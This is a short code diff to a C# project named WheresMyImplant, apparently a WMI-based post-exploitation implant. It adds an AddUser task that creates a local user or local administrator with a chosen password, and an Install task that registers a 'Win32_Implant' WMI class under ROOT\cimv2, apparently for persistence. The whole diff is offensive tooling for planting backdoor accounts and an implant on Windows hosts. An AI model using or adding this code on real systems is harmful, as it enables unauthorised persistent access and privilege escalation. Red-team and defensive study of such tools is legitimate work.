@@ -630,5 +630,31 @@ namespace WheresMyImplant
             }
             return output;
         }
+
+        [ManagementTask]
+        public static String AddUser(String username, String password, String admin)
+        {
+            Boolean isAdmin;
+            if (!Boolean.TryParse(admin, out isAdmin))
+            {
+                return String.Empty;
+            }
+
+            AddUser add = new AddUser();
+            if (isAdmin)
+            {
+                add.AddLocalAdmin(username, password);
+                return "Admin Added";
+            }
+            add.AddLocalUser(username, password);
+            return "User Added";
+        }
+
+        [ManagementTask]
+        public static void Install()
+        {
+            Install install = new Install(".", @"ROOT\cimv2", "Win32_Implant");
+            install.GetMethods();
+        }
     }
 }
